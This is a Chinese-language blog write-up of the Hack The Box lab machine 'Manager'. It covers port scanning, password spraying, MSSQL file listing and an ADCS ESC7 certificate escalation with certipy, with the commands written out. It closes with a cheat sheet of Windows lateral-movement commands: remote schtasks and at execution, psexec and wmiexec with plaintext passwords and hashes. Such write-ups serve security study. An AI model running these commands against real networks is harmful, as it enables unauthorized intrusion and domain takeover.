<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="假期打靶第一弹-Manager"><meta name="keywords" content="渗透测试,域渗透,ADCS"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>假期打靶第一弹-Manager | Alex's blog~</title><meta name="robots" content="noindex"><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ESC7"><span class="toc-number">2.0.1.</span> <span class="toc-text">ESC7</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">3.</span> <span class="toc-text">Conclusion</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">31</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">31</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">假期打靶第一弹-Manager</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-02-02</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>HTB，启动！</p>
<p>靶机地址：<a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Manager">https://app.hackthebox.com/machines/Manager</a></p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>拿到ip地址，先nmap乱扫一遍：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 987 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE           VERSION</span><br><span class="line">53/tcp   open  domain            Simple DNS Plus</span><br><span class="line">80/tcp   open  http              Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Manager</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-02 21:18:46Z)</span><br><span class="line">135/tcp  open  msrpc             Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.manager.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb</span><br><span class="line">| Not valid before: 2023-07-30T13:51:28</span><br><span class="line">|_Not valid after:  2024-07-29T13:51:28</span><br><span class="line">|_ssl-date: 2024-02-02T21:20:27+00:00; +7h00m00s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.manager.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb</span><br><span class="line">| Not valid before: 2023-07-30T13:51:28</span><br><span class="line">|_Not valid after:  2024-07-29T13:51:28</span><br><span class="line">1433/tcp open  ms-sql-s          Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-02-02T12:29:19</span><br><span class="line">|_Not valid after:  2054-02-02T12:29:19</span><br><span class="line">|_ssl-date: 2024-02-02T21:20:27+00:00; +6h59m59s from scanner time.</span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.manager.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb</span><br><span class="line">| Not valid before: 2023-07-30T13:51:28</span><br><span class="line">|_Not valid after:  2024-07-29T13:51:28</span><br><span class="line">|_ssl-date: 2024-02-02T21:20:28+00:00; +6h59m57s from scanner time.</span><br><span class="line">3269/tcp open  globalcatLDAPssl?</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.manager.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb</span><br><span class="line">| Not valid before: 2023-07-30T13:51:28</span><br><span class="line">|_Not valid after:  2024-07-29T13:51:28</span><br><span class="line">|_ssl-date: 2024-02-02T21:20:25+00:00; +7h00m00s from scanner time.</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 1s, median: 6h59m59s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-02-02T21:19:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 139/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   383.31 ms 10.10.14.1 (10.10.14.1)</span><br><span class="line">2   384.80 ms 10.10.11.236 (10.10.11.236)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 123.99 seconds</span><br></pre></td></tr></table></figure>
<p>发现开放了http、sqlserver等服务，还是个域控，域名是dc01.manager.htb。</p>
<p>web界面如下，目测是个静态页面：</p>
<p><img src="https://s2.loli.net/2024/02/02/sLRNkGuSno6bm3W.png" alt=""></p>
<p>先扫一波看看：</p>
<p><img src="https://s2.loli.net/2024/02/02/aT9BDxbiM7XVmWR.png" alt=""></p>
<p>啥也没有，那web打点的思路先放一下，跑下smb：</p>
<p><img src="https://s2.loli.net/2024/02/03/xZQL46bPjTX7Khg.png" alt=""></p>
<p>然后密码喷涂：</p>
<p><img src="https://s2.loli.net/2024/02/03/eRGzixoYSI9hkvr.png" alt=""></p>
<p>尝试列出共享目录：</p>
<p><img src="https://s2.loli.net/2024/02/03/9zSBr17QhyWcR4K.png" alt=""></p>
<p>用刚才喷涂出来的凭据登录之后啥都没有：</p>
<p><img src="https://s2.loli.net/2024/02/03/S1hutn7pb5weK6M.png" alt=""></p>
<p>所以445端口暂时也没什么思路了，但是有用的是我们跑出来了两个用户名和密码，现在还有mssql服务，可以尝试渗透，再进行一次密码喷涂：</p>
<p><img src="https://s2.loli.net/2024/02/03/1qjCp3efDwP2ScY.png" alt=""></p>
<p>有戏，登录进去看看：</p>
<p><img src="https://s2.loli.net/2024/02/03/ghcVODQrkFlaPGx.png" alt=""></p>
<p>发现没有数据库，首先想到的肯定是命令执行，想通过xp_cmdshell执行命令发现没有权限：</p>
<p><img src="https://s2.loli.net/2024/02/03/gK2LNy5Z6rtvDfI.png" alt=""></p>
<p>文章：<a target="_blank" rel="noopener" href="http://www.bmth666.cn/2023/08/06/MSSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/">http://www.bmth666.cn/2023/08/06/MSSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/</a></p>
<p>可以利用mssql去列出目录：<code>EXEC master.sys.xp_dirtree &#39;C:\&#39;, 1, 1;</code></p>
<p>最终找到web目录下的一份源码，可以下载到本地，发现是个静态网站。</p>
<p>找到个配置文件：</p>
<p><img src="https://s2.loli.net/2024/02/03/OGslJY6RMWcbiwT.png" alt=""></p>
<p>nmap中扫描开放了WinRM服务，尝试连下，凭证就是刚才xml中的内容，成功拿到flag：</p>
<p><img src="https://s2.loli.net/2024/02/03/ar19cTkXe2Dwxg8.png" alt=""></p>
<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>查看下用户组，发现当前用户在Certificate Service DCOM Access组中，并且提供CA服务，这波是DC上放CA，彳亍。</p>
<p><img src="https://s2.loli.net/2024/02/03/uCzsgnLI8GBU2kW.png" alt=""></p>
<p>被搅屎了，第二天重置靶机后用certipy检测：</p>
<p><img src="https://s2.loli.net/2024/02/04/MxNIBUzLlPpFKCT.png" alt=""></p>
<p>检测出ESC7，下面是关于此的描述：</p>
<blockquote>
<h4 id="ESC7"><a href="#ESC7" class="headerlink" title="ESC7"></a>ESC7</h4><p>ESC7 is when a user has the <code>Manage CA</code> or <code>Manage Certificates</code> access right on a CA. There are no public techniques that can abuse the <code>Manage Certificates</code> access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.</p>
<p>The <a target="_blank" rel="noopener" href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">“Certified Pre-Owned”</a> whitepaper mentions that this access right can be used to enable the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag to perform the ESC6 attack, but this will not have any effect until the CA service (<code>CertSvc</code>) is restarted. When a user has the <code>Manage CA</code> access right, the user is also allowed to restart the service. However, it does not mean that the user can restart the service remotely.  Furthermore, ESC6 might not work out of the box in most patched  environments due to the May 2022 security updates.</p>
<p>Instead, I’ve found another technique that doesn’t require any service restarts or configuration changes.</p>
<p><strong>Prerequisites</strong></p>
<p>In order for this technique to work, the user must also have the <code>Manage Certificates</code> access right, and the certificate template <code>SubCA</code> must be enabled. With the <code>Manage CA</code> access right, we can fulfill these prerequisites.</p>
<p>The technique relies on the fact that users with the <code>Manage CA</code> <em>and</em> <code>Manage Certificates</code> access right can issue failed certificate requests. The <code>SubCA</code> certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the <code>SubCA</code> - which will be denied - but then issued by the manager afterwards.</p>
<p>If you only have the <code>Manage CA</code> access right, you can grant yourself the <code>Manage Certificates</code> access right by adding your user as a new officer.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy ca -ca &#39;corp-DC-CA&#39; -add-officer john -username john@corp.local -password Passw0rd</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Successfully added officer &#39;John&#39; on &#39;corp-DC-CA&#39;</span><br></pre></td></tr></table></figure>
<p>​    </p>
<p>The <code>SubCA</code> template can be enabled on the CA with the <code>-enable-template</code> parameter. By default, the <code>SubCA</code> template is enabled.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy ca -ca &#39;corp-DC-CA&#39; -enable-template SubCA -username john@corp.local -password Passw0rd</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Successfully enabled &#39;SubCA&#39; on &#39;corp-DC-CA&#39;</span><br></pre></td></tr></table></figure>
<p><strong>Attack</strong></p>
<p>If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the <code>SubCA</code> template.</p>
<p>This request will be denied, but we will save the private key and note down the request ID.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Requesting certificate via RPC</span><br><span class="line">&gt;[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.</span><br><span class="line">&gt;[*] Request ID is 785</span><br><span class="line">&gt;Would you like to save the private key? (y&#x2F;N) y</span><br><span class="line">&gt;[*] Saved private key to 785.key</span><br><span class="line">&gt;[-] Failed to request certificate</span><br></pre></td></tr></table></figure>
<p>​    </p>
<p>With our <code>Manage CA</code> and <code>Manage Certificates</code>, we can then issue the failed certificate request with the <code>ca</code> command and the <code>-issue-request &lt;request ID&gt;</code> parameter.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy ca -ca &#39;corp-DC-CA&#39; -issue-request 785 -username john@corp.local -password Passw0rd</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Successfully issued certificate</span><br></pre></td></tr></table></figure>
<p>​    </p>
<p>And finally, we can retrieve the issued certificate with the <code>req</code> command and the <code>-retrieve &lt;request ID&gt;</code> parameter.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Rerieving certificate with ID 785</span><br><span class="line">&gt;[*] Successfully retrieved certificate</span><br><span class="line">&gt;[*] Got certificate with UPN &#39;administrator@corp.local&#39;</span><br><span class="line">&gt;[*] Certificate has no object SID</span><br><span class="line">&gt;[*] Loaded private key from &#39;785.key&#39;</span><br><span class="line">&gt;[*] Saved certificate and private key to &#39;administrator.pfx&#39;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>首先创建一个officer，然后启用证书模板并请求证书，该请求将被拒绝，但我们将保存私钥并记下请求 ID：</p>
<p><img src="https://s2.loli.net/2024/02/04/IR7GWczvjwOpEQ3.png" alt=""></p>
<p>签发所请求的证书，然后可以检索证书（签发过程可能失败，重试两次即可，但注意要保证证书的id一致）：</p>
<p><img src="https://s2.loli.net/2024/02/04/hLBz6J2tw4gqGmv.png" alt=""></p>
<p>然后证书传递，生成一个Kerberos TGT票据和administrator的hash：</p>
<p><img src="https://s2.loli.net/2024/02/04/5vLxQOmZkbXwJjA.png" alt=""></p>
<p>报错了，需要先和dc同步下时钟：</p>
<p><img src="https://s2.loli.net/2024/02/04/wOzoNXE1jrmTf3P.png" alt=""></p>
<p>拿到管理员的hash值：</p>
<p><img src="https://s2.loli.net/2024/02/04/FC3QUljtgRo4snM.png" alt=""></p>
<p>利用hash登录账户后，提权成功，拿到root flag：</p>
<p><img src="https://s2.loli.net/2024/02/04/HWE3hq2F9zXe7KL.png" alt=""></p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>一个内网渗透的小总结笔记：</p>
<p>一般内网渗透首先要搜集基本信息，来判断当前服务器的角色、网络环境等信息：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo <span class="comment">#详细信息</span></span><br><span class="line">net <span class="built_in">start</span> <span class="comment">#启动服务</span></span><br><span class="line">tasklist <span class="comment">#进程列表</span></span><br><span class="line">schtasks <span class="comment">#计划任务</span></span><br></pre></td></tr></table></figure>
<p>然后收集网络架构相关信息：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all <span class="comment"># 判断存在域-dns</span></span><br><span class="line">net view /domain <span class="comment"># 判断存在域</span></span><br><span class="line">net time /domain <span class="comment"># 判断主域</span></span><br><span class="line">netstat <span class="literal">-ano</span> <span class="comment"># 当前网络端口开放</span></span><br><span class="line">nslookup <span class="comment"># 域名解析</span></span><br></pre></td></tr></table></figure>
<p>系统默认的用户身份：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain Admins：域管理员（默认对域控制器有完全控制权）</span><br><span class="line">Domain Computers：域内机器</span><br><span class="line">Domain Controllers：域控制器</span><br><span class="line">Domain Guest：域访客，权限低</span><br><span class="line">Domain Users：域用户</span><br><span class="line">Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</span><br></pre></td></tr></table></figure>
<p>用户身份查询：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">whoami /all 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net user 本地用户</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net user /domain 获取域用户信息</span><br><span class="line">net <span class="built_in">group</span> /domain 获取域用户组信息</span><br><span class="line">wmic useraccount get /all 涉及域用户详细信息</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain 查询域管理员账户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Enterprise Admins&quot;</span> /domain 查询管理员用户组</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain 查询域控制器</span><br></pre></td></tr></table></figure>
<p>常见的凭据信息收集：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.站点源码备份文件、数据库备份文件等</span><br><span class="line">2.各类数据库 Web 管理入口，如 PHPMyAdmin</span><br><span class="line">3.浏览器保存密码、浏览器 Cookies</span><br><span class="line">4.其他用户会话、3389 和 ipc$连接记录、回收站内容</span><br><span class="line">5.Windows 保存的 WIFI 密码</span><br><span class="line">6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</span><br></pre></td></tr></table></figure>
<p>横向渗透明文传递的手法：拿到一台主机后，通过本地信息收集用户凭证，可以利用at和schtasks等横向渗透。</p>
<p>利用流程：</p>
<ol>
<li>建立 IPC 链接到目标主机</li>
<li>拷贝要执行的命令脚本到目标主机</li>
<li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li>
<li>删除 IPC 链接</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net use \\server\ipc<span class="variable">$</span><span class="string">&quot;password&quot;</span> /user:username <span class="comment"># 工作组</span></span><br><span class="line">net use \\server\ipc<span class="variable">$</span><span class="string">&quot;password&quot;</span> /user:domain\username <span class="comment">#域内</span></span><br><span class="line"><span class="built_in">dir</span> \\xx.xx.xx.xx\C<span class="variable">$</span>\ <span class="comment"># 查看文件列表</span></span><br><span class="line"><span class="built_in">copy</span> \\xx.xx.xx.xx\C<span class="variable">$</span>\<span class="number">1</span>.bat <span class="number">1</span>.bat <span class="comment"># 下载文件</span></span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.bat \\xx.xx.xx.xx\C<span class="variable">$</span> <span class="comment"># 复制文件</span></span><br><span class="line">net use \\xx.xx.xx.xx\C<span class="variable">$</span>\<span class="number">1</span>.bat /<span class="built_in">del</span> <span class="comment"># 删除 IPC</span></span><br><span class="line">net view xx.xx.xx.xx <span class="comment"># 查看对方共享</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#at &lt; Windows2012</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.21</span>\ipc<span class="variable">$</span> <span class="string">&quot;Admin12345&quot;</span> /user:god.org\ad</span><br><span class="line">ministrator <span class="comment"># 建立 ipc 连接：</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.21</span>\c<span class="variable">$</span> <span class="comment">#拷贝执行文件到目标机器</span></span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">3.21</span> <span class="number">15</span>:<span class="number">47</span> c:\add.bat <span class="comment">#添加计划任务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#schtasks &gt;=Windows2012</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:god.org\ad</span><br><span class="line">ministrator <span class="comment"># 建立 ipc 连接：</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span> <span class="comment">#复制文件到其 C 盘</span></span><br><span class="line">schtasks /create /s <span class="number">192.168</span>.<span class="number">3.32</span> /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /<span class="built_in">sc</span> DAILY /tr c:\add.bat /F <span class="comment">#创建 adduser 任务</span></span><br><span class="line"></span><br><span class="line">schtasks /run /s <span class="number">192.168</span>.<span class="number">3.32</span> /tn adduser /i <span class="comment">#运行 adduser 任务</span></span><br><span class="line">schtasks /delete /s <span class="number">192.168</span>.<span class="number">3.21</span> /tn adduser /f<span class="comment">#删除 adduser 任务</span></span><br></pre></td></tr></table></figure>
<p>IPC的常见错误代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</span><br><span class="line">（2）51：网络问题，Windows 无法找到网络路径</span><br><span class="line">（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有</span><br><span class="line">防火墙等问题</span><br><span class="line">（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$</span><br><span class="line">（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</span><br><span class="line">（6）1326：账号密码错误</span><br><span class="line">（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</span><br><span class="line">（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</span><br></pre></td></tr></table></figure>
<p>利用SMB（445端口）服务，可以通过哈希传递或者明文传递来远程执行：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:ad</span><br><span class="line">ministrator</span><br><span class="line">psexec \\<span class="number">192.168</span>.<span class="number">3.32</span> <span class="literal">-s</span> cmd <span class="comment"># 需要先有 ipc 链接 -s 以 System 权限运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#psexec 第二种：不用建立 IPC 直接提供明文账户密码</span></span><br><span class="line">psexec \\<span class="number">192.168</span>.<span class="number">3.21</span> <span class="literal">-u</span> administrator <span class="literal">-p</span> Admin12345 <span class="literal">-s</span> cmd</span><br><span class="line">psexec <span class="literal">-hashes</span> :<span class="variable">$HASH</span><span class="variable">$</span> ./administrator@<span class="number">10.1</span>.<span class="number">2.3</span></span><br><span class="line">psexec <span class="literal">-hashes</span> :<span class="variable">$HASH</span><span class="variable">$</span> domain/administrator@<span class="number">10.1</span>.<span class="number">2.3</span></span><br><span class="line">psexec <span class="literal">-hashes</span> :<span class="number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="number">192.168</span>.<span class="number">3.32</span></span><br></pre></td></tr></table></figure>
<p>还可以通过WMI服务（139端口）利用，此方法不会在目标日志系统留下痕迹：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#自带 WMIC 明文传递 无回显</span></span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">3.21</span> /user:administrator /password:Admin12345 <span class="keyword">process</span> call create <span class="string">&quot;cmd.exe /c </span></span><br><span class="line"><span class="string">ipconfig &gt;C:\1.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自带 cscript 明文传递 有回显</span></span><br><span class="line">cscript //nologo wmiexec.vbs /shell <span class="number">192.168</span>.<span class="number">3.21</span> administrator Admin12345</span><br><span class="line"></span><br><span class="line"><span class="comment">#套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</span></span><br><span class="line">wmiexec ./administrator:admin!<span class="selector-tag">@</span><span class="comment">#45@192.168.3.32 &quot;whoami&quot;</span></span><br><span class="line">wmiexec god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec <span class="literal">-hashes</span> :<span class="number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="number">192.168</span>.<span class="number">3.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec <span class="literal">-hashes</span> :ccef208c6485269c20db2cad21734fe7 god/administrator@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
<p>个人感觉还是impacket好使。</p>
<p>Kerberos协议：</p>
<ol>
<li><p>客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密，发送给 kdc，kdc 对用户进行检测，成功之后创建 TGT。</p>
</li>
<li><p>将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读取 kerberos 中 TGT 数据，然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测</p>
</li>
<li><p>检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将加密后的结果返回给客户机。</p>
</li>
</ol>
<p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash访问远程主机或服务，而不用提供明文密码。如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys代替 NT hash 来实现 ptk 攻击。</p>
<p>pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接</p>
<p>ptk：打了补丁才能用户都可以连接，采用 aes256 连接</p>
<p>还有黄金票据、白银票据以及若干提权手法，遇到了再总结。</p>
